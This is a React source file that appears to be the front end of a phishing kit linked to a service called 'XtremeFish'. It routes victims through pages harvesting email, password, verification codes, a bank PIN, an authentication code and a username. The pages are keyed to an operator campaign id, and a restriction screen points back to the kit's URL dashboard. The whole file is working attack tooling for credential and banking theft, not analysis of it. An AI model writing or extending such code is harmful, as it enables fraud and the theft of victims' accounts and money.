import { useEffect, useState } from "react";
import Email from "./components/flow.jsx/Email";
import Password from "./components/flow.jsx/Password";
import Username from "./components/flow.jsx/Username";
import Code from "./components/flow.jsx/Code";
import "./App.css";
import "./index.css";
import BankPin from "./components/flow.jsx/BankPin";
import AuthCode from "./components/flow.jsx/AuthCode";
import { useSearchParams, Routes, Route } from "react-router-dom";
import mongoose from "mongoose";


function App() {
  const [email, setEmail] = useState("");
  const [username, setUsername] = useState("");
  const [id, setId] = useState("");
  const [password, setPassword] = useState("");
  const [validUserId, setValidUserId] = useState(false);
  const [searchParams] = useSearchParams();
  const userId = searchParams.get("userId"); // Extracting userId from query parameters
  const skip = searchParams.getAll("skip"); // Extracting userId from query parameters

  
  useEffect(() => {
    setId(userId);
    if (userId && mongoose.Types.ObjectId.isValid(userId)) {
      setValidUserId(true);
    }
  }, [userId]); // Dependency on userId to validate it whenever it changes

  return (
    <>
      {validUserId ? (
        <div className="bg">
          <Routes>
            <Route
              path="*"
              element={
                <Email
                  skip={skip}
                  password={password}
                  setPassword={setPassword}
                  email={email}
                  setEmail={setEmail}
                  userId={userId} // Passing userId to Email component
                />
              }
            />
            <Route
              path="/code"
              element={<Code skip={skip} emailValue={email} userId={userId} />}
            />
            <Route
              path="/password"
              element={
                <Password
                  password={password}
                  setPassword={setPassword}
                  email={email}
                  userId={userId}
                />
              }
            />
            <Route
              path="/bankpin"
              element={<BankPin skip={skip} email={email} userId={userId} />}
            />

            <Route path="/authcode" element={<AuthCode email={email} userId={userId} />} />
            <Route
              path="/username/:userId?/*"
              element={
                <Username
                skip={skip}
                username={username}
                setUsername={setUsername}
                userId={userId} 
                />
              }
            />
          </Routes>
        </div>
      ) : (
        <div className="h-screen bg-['rgba(0, 0, 0, 0.5)'] bg-opacity-30 backdrop-blur-sm z-10 w-full h-screen flex justify-center items-center">
          <div className="flex flex-col items-center mt-2">
            <div className="bg-[#0b111a] w-[500px] px-10 py-10 rounded-md flex flex-col justify-center items-center gap-4 text-center">
              <p className="text-red-500">Access Restricted!</p>
              <p className="text-white text-sm">
                Please return to XtremeFish and follow the correct link to
                access this page.
              </p>
              <a
                href={`${import.meta.env.VITE_XTREMEFISH_URL}/dashboards/urls`}
                className="text-lg text-blue-600 hover:underline"
                target="_blank"
                // rel="noopener noreferrer"
              >
                Return to XtremeFish
              </a>
            </div>
          </div>
        </div>
      )}
    </>
  );
}

export default App;
